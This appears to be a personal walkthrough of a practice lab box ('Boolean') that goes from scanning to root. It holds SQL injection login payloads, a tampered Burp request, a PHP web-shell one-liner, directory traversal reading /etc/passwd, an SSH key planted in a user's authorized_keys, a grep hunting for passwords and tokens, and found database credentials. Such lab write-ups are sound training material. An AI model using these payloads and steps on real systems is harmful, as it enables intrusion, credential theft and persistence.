Gonna take a while guess that this is Boolean SQLi box

```
sudo nmap -sC -sV -vv 192.168.247.42  -oN nmap-boolean
```


![[PG/Linux/attachments/Pasted image 20250709162701.png]]

All ports 

```
sudo nmap -sC -sV -vv -p- 192.168.247.42  -oN nmap-boolean-all-ports
```

# Web (80)

![[PG/Linux/attachments/Pasted image 20250709164644.png]]

Payload 1
```
admin' OR 1=1 -- -
```

```
admin' AND 1=1 -- -
```

```
admin' OR '1'='1
```

```
admin' OR '1'='0
```

I created an account 

![[PG/Linux/attachments/Pasted image 20250709164850.png]]


## Ferox 

```
feroxbuster -u http://192.168.194.231/login -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox.out
```

This is interesting 

![[PG/Linux/attachments/Pasted image 20250709165128.png]]
- no it isn't

# Manipulating Burp Parameters 

The /settings/email page needed the email confirmation..

Manipulating the confirmed parameter to be true.

Before manipulation - Request
![[PEN-200/10. SQL Injection Attacks/attachments/Pasted image 20250709211040.png]]

Before manipulation - Response 
![[PEN-200/10. SQL Injection Attacks/attachments/Pasted image 20250709211107.png]]

Payload - removed the email parameter and replaced with confirmed=true

```
_method=patch&authenticity_token=NRHHffkZqr8iuk3qaKOX6_P4IMBTbvEPFtvulhfO363lripmFgYqIPXo4YsbBMEjFSrMOmEwQ0FWigRU_KWpNw'AND+1%3d1&user%5Bconfirmed=true&commit=Change%20email
```
![[PEN-200/10. SQL Injection Attacks/attachments/Pasted image 20250709210846.png]]


Response 
![[PEN-200/10. SQL Injection Attacks/attachments/Pasted image 20250709210947.png]]

![[PEN-200/10. SQL Injection Attacks/attachments/Pasted image 20250709211135.png]]

Can we see anything in the browser?

Yeah - just log back in on website and we're good.

![[PEN-200/10. SQL Injection Attacks/attachments/Pasted image 20250709211403.png]]
- Oh boyyyyy.. a file upload 

Let's give a web shell

[Cheatsheet](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Boolean%20Based%20Blind%20SQLi)

```
<?php system($_GET['cmd']); ?>
```

Easy 

![[PG/Linux/attachments/Pasted image 20250709211844.png]]

It's not being executed though 

![[PG/Linux/attachments/Pasted image 20250709212050.png]]

It just downloaded to my box lol

Here's the request in Burp 

![[PG/Linux/attachments/Pasted image 20250709212203.png]]

Trying this to read /etc/passwd - directory traversal 

![[PG/Linux/attachments/Pasted image 20250709213304.png]]

We see a couple of legit users here 

![[PG/Linux/attachments/Pasted image 20250709213431.png]]

Try to read remi's .ssh directory

Create an ssh key to upload 

[Quick guide ](https://mqt.gitbook.io/oscp-notes/ssh-keys?source=post_page-----9c7f5b963559---------------------------------------)

```
ssh-keygen
```

![[PG/Linux/attachments/Pasted image 20250709214022.png]]

![[PG/Linux/attachments/Pasted image 20250709214046.png]]
Uploaded public key
![[PG/Linux/attachments/Pasted image 20250709214406.png]]

```
chmod 600 id_ed25519
```


![[PG/Linux/attachments/Pasted image 20250709215921.png]]

Upload the authorized_keys in home/remi/.ssh folder

![[PG/Linux/attachments/Pasted image 20250709220057.png]]

Well I'll be damned 

```
ssh remi@192.168.194.231 -i id_ed25519
```
![[PG/Linux/attachments/Pasted image 20250709220213.png]]

We're in

![[PG/Linux/attachments/Pasted image 20250709220330.png]]

Ugh

![[PG/Linux/attachments/Pasted image 20250709220453.png]]

Lots of files here 

![[PG/Linux/attachments/Pasted image 20250709220557.png]]

```
grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'
```

This has a TON of output but we see some db creds 

![[PG/Linux/attachments/Pasted image 20250709220820.png]]

```
boolean:superdupersekiyurpass
```

Login to database 

```
mysql -u boolean -psuperdupersekiyurpass
```

![[PG/Linux/attachments/Pasted image 20250709221348.png]]

```
show databases;
```

![[PG/Linux/attachments/Pasted image 20250709221325.png]]

```
use boolean_development;
```

```
show tables;
```

![[PG/Linux/attachments/Pasted image 20250709221448.png]]

```
select * from users;
```

It's me!!
![[PG/Linux/attachments/Pasted image 20250709221532.png]]

```
select * from ar_internal_metadata;
```

![[PG/Linux/attachments/Pasted image 20250709221629.png]]

```
select * from schema_migrations;
```

![[PG/Linux/attachments/Pasted image 20250709221721.png]]

Waste of time. 

The dang root key is right here.

![[PG/Linux/attachments/Pasted image 20250709221850.png]]

```
ssh -i root root@127.0.0.1
```

![[PG/Linux/attachments/Pasted image 20250709222031.png]]
